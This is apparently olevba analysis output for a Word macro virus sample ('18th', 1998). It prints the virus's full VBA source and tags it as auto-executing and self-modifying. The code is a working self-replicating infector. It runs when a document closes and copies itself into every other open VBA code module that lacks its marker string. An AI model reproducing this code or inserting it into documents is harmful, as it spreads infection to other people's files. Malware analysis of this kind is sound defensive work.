olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.18th-6254104fb8844cfed34232056e7714bcdc613e93
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.18th-6254104fb8844cfed34232056e7714bcdc613e93 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - 18th
Sub AutoClose(): Document_Close: End Sub
Private Sub Document_Close()
 On Error Resume Next
 For Јd = 1 To VBE.CodePanes.Count
 Set Јo = VBE.CodePanes(Јd).CodeModule
    If Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 0 Then
        Јf = Јo.Lines(1, Јo.CountOfLines): Јh = 1: Јd = 0
    End If
    If Not Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 1 Then
        VBE.CodePanes(Јd).CodeModule.InsertLines 1, Јf
    End If
 Next
End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
